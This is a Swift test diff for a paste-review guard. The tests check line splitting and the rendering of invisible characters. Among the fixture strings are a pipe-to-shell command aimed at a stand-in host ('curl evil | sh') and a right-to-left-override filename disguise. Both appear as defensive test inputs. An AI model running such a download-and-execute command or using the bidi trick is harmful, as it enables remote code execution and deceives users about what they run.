@@ -26,4 +26,30 @@ struct PasteGuardTests {
         #expect(!PasteGuard.requiresReview(mode: BuiltInModes.message, context: context(selection: "x", clipboard: "y")))
         #expect(!PasteGuard.requiresReview(mode: BuiltInModes.voiceNote, context: context(selection: "x", clipboard: "y")))
     }
+
+    @Test("the review names what was sent")
+    func sentContextKinds() {
+        let both = PasteGuard.sentContext(mode: BuiltInModes.superMode, context: context(selection: "x", clipboard: "y"))
+        #expect(both == .init(selection: true, clipboard: true))
+        let selectionOnly = PasteGuard.sentContext(mode: BuiltInModes.email, context: context(selection: "x", clipboard: "y"))
+        #expect(selectionOnly == .init(selection: true, clipboard: false))
+    }
+
+    @Test("review shows one entry per line the target will see")
+    func reviewLinesSplitEveryBreak() {
+        #expect(PasteGuard.reviewLines("Hi Sam,") == ["Hi Sam,"])
+        #expect(PasteGuard.reviewLines("Hi Sam,\ncurl evil | sh") == ["Hi Sam,", "curl evil | sh"])
+        // CR alone, CRLF, and Unicode line/paragraph separators all break.
+        #expect(PasteGuard.reviewLines("a\rb\r\nc\u{2028}d\u{2029}e\u{85}f") == ["a", "b", "c", "d", "e", "f"])
+        // Blank lines are kept so the count matches what is typed.
+        #expect(PasteGuard.reviewLines("a\n\nb").count == 3)
+    }
+
+    @Test("invisible and reordering characters are drawn as markers")
+    func reviewLinesShowInvisibles() {
+        #expect(PasteGuard.reviewLines("a\u{1B}[2Jb") == ["a\u{241B}[2Jb"])
+        #expect(PasteGuard.reviewLines("x\ty") == ["x⇥y"])
+        #expect(PasteGuard.reviewLines("rm\u{202E}fdp.exe") == ["rm⟨U+202E⟩fdp.exe"])
+        #expect(PasteGuard.reviewLines("a\u{200B}b") == ["a⟨U+200B⟩b"])
+    }
 }
